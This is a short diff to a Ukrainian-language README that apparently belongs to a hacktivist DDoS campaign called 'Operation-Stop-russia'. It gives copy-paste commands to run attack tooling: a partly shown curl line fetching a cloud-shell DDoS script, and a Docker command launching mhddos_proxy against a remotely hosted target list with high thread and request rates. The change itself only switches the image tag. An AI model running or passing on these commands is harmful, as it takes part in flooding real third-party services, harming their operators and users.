@@ -18,7 +18,7 @@ curl -L https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos
 ```
 :white_check_mark:**Команда для встановлення та запуску mhddos_proxy** (*Docker*):
 ```
-sudo docker run -it --rm  --cpus="0.7" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 3000 --vpn 1 --http-methods GET --rpc 500
+sudo docker run -it --rm  --cpus="0.7" --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:old -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7.lst -t 3000 --vpn 1 --http-methods GET --rpc 500
 ```
 :white_check_mark: **Команда для встановлення та запуску db1000n** (Bash):
 ```
